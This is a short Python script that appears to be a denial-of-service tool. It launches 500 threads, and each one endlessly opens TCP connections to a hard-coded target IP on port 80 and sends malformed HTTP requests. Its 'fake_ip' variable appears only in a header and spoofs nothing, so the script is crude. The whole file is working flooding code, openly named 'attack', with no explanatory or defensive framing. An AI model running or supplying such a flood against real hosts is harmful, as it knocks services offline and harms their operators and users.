#!/usr/bin/env python3

import threading
import socket

target = "192.168.0.1"
port = 80
fake_ip = "192.168.0.7"

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("HOST /" + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
for i in range(500):
    thread = threading.Thread(target = attack)
    thread.start()
